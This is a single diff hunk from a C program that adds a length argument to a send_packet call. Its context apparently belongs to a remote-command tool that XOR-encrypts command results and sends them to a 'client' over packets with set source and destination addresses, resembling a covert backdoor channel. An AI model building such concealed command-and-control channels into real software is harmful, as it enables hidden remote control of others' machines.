@@ -285,7 +285,7 @@ int send_command(char * command, const struct ip_struct * ip, const int dest_por
 		//Encrypt payload
 		
 		//Send it over to the client
-		send_packet(xor_cipher(packet, strlen(packet)), src, dst, dest_port);
+		send_packet(xor_cipher(packet, strlen(packet)), strlen(packet), src, dst, dest_port);
 		
 		memset(packet, 0, sizeof(packet));
 		memset(cmd_results, 0, sizeof(cmd_results));
